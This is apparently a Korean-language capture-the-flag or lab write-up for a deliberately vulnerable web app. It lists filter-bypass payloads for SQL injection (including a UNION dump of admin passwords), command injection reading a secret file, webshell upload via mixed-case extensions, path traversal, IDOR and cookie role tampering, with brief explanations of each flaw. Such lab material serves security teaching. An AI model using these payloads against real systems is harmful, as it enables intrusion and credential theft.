[02] SQL Injection — 공백 필터 우회 + UNION 덤프

페이지: /search  |  필터: 공백(" ") 제거

기본 페이로드 (차단됨):

' OR 1=1--

실제 우회 페이로드: 공백을 /**/로 대체

'/**/OR/**/1=1--

관리자 비밀번호 덤프 페이로드:

'/**/UNION/**/SELECT/**/id,username,password/**/FROM/**/users/**/WHERE/**/role='admin'--

획득 정보: admin_PB 계정의 비밀번호 PBKOR!@

🏁 FLAG: SQL Injection으로 admin_PB / PBKOR!@ 획득

[03] Command Injection — ; & 필터 우회

페이지: /ping  |  필터: ; 와 & 제거

기본 페이로드 (차단됨):

127.0.0.1; id

실제 우회 페이로드: | 파이프 사용

127.0.0.1| id

목표 파일 읽기 페이로드:

127.0.0.1|cat /app/data/secret.txt

획득 정보: /app/data/secret.txt — 관리자 크리덴셜 (admin_PB / PBKOR!@)

🏁 FLAG: CMDi로 secret.txt 내용 출력 성공

[04A] 파일 업로드 — 블랙리스트 대소문자 우회

페이지: /upload  |  필터: 소문자 확장자 블랙리스트 (php jsp asp aspx sh py rb pl)

기본 페이로드 (차단됨):

webshell.php

실제 우회 페이로드: 대문자 또는 혼합 대소문자 확장자 사용

webshell.PHP
webshell.PhP
webshell.phtml

원리: 서버가 ext in BLACKLIST_EXT로만 검사하며 소문자 변환을 하지 않아 대소문자 혼용 시 통과

🏁 FLAG: .PHP / .phtml 확장자로 웹쉘 업로드 성공

[04B] Path Traversal — ../ 단순 제거 우회

페이지: /download  |  필터: ../ 를 한 번 제거

기본 페이로드 (차단됨):

../etc/passwd

실제 우회 페이로드: ....// 중첩 사용 (제거 후 ../ 재구성)

....//....//app/data/secret.txt

원리: ....//에서 ../를 제거하면 .../ → 실제로는 ../가 남음

획득 정보: /app/data/secret.txt — 관리자 크리덴셜

🏁 FLAG: Path Traversal로 secret.txt 읽기 성공

[05] IDOR — URL 파라미터 직접 조작

페이지: /mypage  |  필터: 없음 (인증 검사 자체가 없음)

기본 페이로드:

?user_id=1

원리: 서버가 요청자 본인 여부를 확인하지 않고 user_id 파라미터를 그대로 DB 조회에 사용

우회 방법: URL에서 user_id 값을 1~4로 변경하면 모든 사용자 정보 열람 가능

/mypage?user_id=1

획득 정보: user_id=1 → admin_PB 계정의 이메일, 전화번호

🏁 FLAG: IDOR으로 다른 사용자 정보 열람 성공 (인식 챌린지)

[06] 쿠키 권한 상승 — role 쿠키 변조

페이지: /admin  |  필터: 없음 (쿠키를 서버 세션 없이 신뢰)

기본 페이로드 (현재 쿠키 상태):

role=user

실제 우회 페이로드: 브라우저 개발자 도구에서 쿠키 값 변경

role=admin

우회 방법:

  1. F12 → Application 탭 → Cookies → 현재 도메인 선택
  2. role 쿠키 값을 user에서 admin으로 변경
  3. /admin 페이지 새로고침

원리: 서버가 서명되지 않은 클라이언트 쿠키를 그대로 신뢰하며 세션 검증 없음

🏁 FLAG: role=admin 쿠키로 관리자 패널 접근 성공
